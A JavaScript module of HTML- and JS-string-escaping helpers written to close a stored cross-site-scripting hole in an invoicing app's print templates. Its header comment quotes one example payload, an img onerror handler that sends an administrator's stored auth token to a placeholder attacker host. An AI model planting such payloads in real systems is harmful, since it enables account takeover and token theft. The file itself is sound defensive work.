/**
 * HTML escaping for the print/report templates.  [V-13]
 *
 * WHY THIS FILE EXISTS
 * --------------------
 * React escapes everything it renders, so the JSX in this app was never the
 * problem. The problem is that receipts and reports are not rendered by React:
 * they are assembled as template strings and handed to document.write() in a
 * new window, at
 *
 *   src/pages/Invoice/CreateInvoice.jsx:1751
 *   src/pages/Invoice/SalesHistory.jsx:1011, 1288
 *   src/components/sales-report/PdfGenerator.jsx:338, 534, 596
 *   src/pages/Report/ProfitReport.jsx:725
 *
 * Those templates interpolated server data raw - customer name, customer
 * phone, cashier name, department name and address, product name, and the
 * free-text invoice note. A repository-wide search for
 * escapeHtml|sanitiz|DOMPurify found no escaping anywhere in src/, and the one
 * function that looked like a sanitiser, cleanProductName() at
 * CreateInvoice.jsx:1299, had lost its .replace() and simply returned its
 * input.
 *
 * THE EXPLOIT THIS CLOSES
 * -----------------------
 * A cashier saves a customer named, or types into an invoice note,
 *
 *   <img src=x onerror="fetch('https://evil.example/?t='+localStorage.authToken)">
 *
 * Nothing happens until an ADMINISTRATOR later prints that invoice from Sales
 * History. The payload then executes in a same-origin window and exfiltrates
 * the admin's bearer token, which the original app kept in localStorage where
 * script can read it (V-16) and which never expired (V-06). Stored XSS to full
 * account takeover, triggered by a routine business action.
 *
 * OWASP A03:2021 Injection  |  CWE-79 Cross-site Scripting
 */

/**
 * Escape a value for interpolation into HTML *text* or a *quoted attribute*.
 *
 * All five characters are escaped, not just the three that close a tag:
 * `"` and `'` matter because these templates interpolate into attributes such
 * as `<div class="x" title="${name}">`, where escaping only `<`, `>` and `&`
 * would still let an attacker break out of the quotes and add an event
 * handler.
 *
 * `&` is replaced first; doing it later would double-escape the entities
 * produced by the other replacements.
 *
 * @param {unknown} value - any value; null and undefined become an empty string
 * @returns {string} a string safe to interpolate into HTML text or an attribute
 */
export function escapeHtml(value) {
  if (value === null || value === undefined) return "";

  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

/**
 * Tagged-template helper that escapes every interpolated value automatically.
 *
 * Preferred over calling escapeHtml() at each `${...}`, because it cannot be
 * forgotten on one field out of twelve - which is exactly how the original
 * templates ended up with no escaping at all:
 *
 *   html`<div class="name">${customerName}</div>`
 *
 * Values that are already trusted markup can be opted out with raw().
 */
export function html(strings, ...values) {
  return strings.reduce((out, chunk, i) => {
    if (i === 0) return chunk;
    const value = values[i - 1];
    const rendered = value && value.__rawHtml ? value.value : escapeHtml(value);
    return out + rendered + chunk;
  }, "");
}

/**
 * Mark a string as trusted markup, exempting it from escaping inside html``.
 *
 * Only ever pass markup this application itself constructed - never anything
 * that came from the API, a form field or a spreadsheet.
 */
export function raw(value) {
  return { __rawHtml: true, value: String(value ?? "") };
}

/**
 * Escape a value for use inside a JavaScript string literal in a <script>
 * block. HTML escaping is the wrong tool there - the browser unescapes
 * entities before the JS parser runs, so &quot; would become a real quote.
 *
 * Provided for completeness; the print templates in this app contain only one
 * inline script (window.print()) and interpolate nothing into it.
 */
export function escapeJsString(value) {
  if (value === null || value === undefined) return "";

  return String(value)
    .replace(/\\/g, "\\\\")
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, "\\n")
    .replace(/\r/g, "\\r")
    // U+2028 and U+2029 are literal line terminators inside a
    // JavaScript string, so they have to be escaped or they break
    // out of it. Written as a character class with escape
    // sequences - a raw separator here would terminate this very
    // regex literal.
    .replace(/[\u2028\u2029]/g, (c) =>
      c === "\u2028" ? "\\u2028" : "\\u2029"
    )
    .replace(/</g, "\\u003C") // prevents an embedded </script> from closing the block
    .replace(/>/g, "\\u003E");
}

export default escapeHtml;
